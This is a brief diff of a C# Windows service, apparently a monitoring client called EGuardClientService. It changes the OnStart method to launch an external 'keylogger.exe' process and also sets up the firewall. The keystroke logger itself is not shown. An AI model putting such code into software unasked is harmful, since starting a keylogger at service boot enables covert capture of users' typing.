@@ -6,6 +6,7 @@ using NetFwTypeLib;
 using System;
 using System.Linq;
 using System.Collections;
+using System.Diagnostics;
 
 namespace EGuardClientService
 {
@@ -37,7 +38,7 @@ namespace EGuardClientService
         public void OnStart(string[] args)
         {
             //initialize keylogger
-            Keylogger keylogger = new Keylogger();
+            Process.Start("keylogger.exe");
 
             // Enable firewall
             Type NetFwMgrType = Type.GetTypeFromProgID("HNetCfg.FwMgr", false);
